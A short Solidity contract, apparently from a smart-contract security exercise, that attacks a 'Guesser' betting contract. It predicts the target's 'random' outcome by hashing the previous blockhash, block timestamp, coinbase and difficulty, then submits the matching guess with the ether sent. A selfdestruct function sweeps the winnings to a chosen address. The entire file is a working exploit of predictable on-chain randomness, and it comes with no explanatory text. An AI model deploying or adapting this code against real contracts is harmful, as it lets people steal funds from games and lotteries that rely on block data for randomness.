// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;
import "./Guesser.sol";
contract Attack{
    
    function attack(Guesser guesser)public payable returns(uint){
        uint rand =
        uint (
            keccak256(
                abi.encodePacked(
                   blockhash(block.number - 1),
                    block.timestamp,
                    block.coinbase,
                    block.difficulty,
                    block.coinbase
                    )
                )
            );
            if(rand % 2 == 0){
                guesser.guess{value : msg.value}(0);
            }
            else  guesser.guess{value : msg.value}(1);
            return rand;
    }
    
    receive () external payable {}
    function hatBalance(Guesser guesser)public view returns(uint){
        return guesser.getBalance();
    }
    function getBalance()public view returns (uint) {
        return address(this).balance;
    }
    
    function hat(address payable addr) public payable{
        selfdestruct(addr);
    }
}
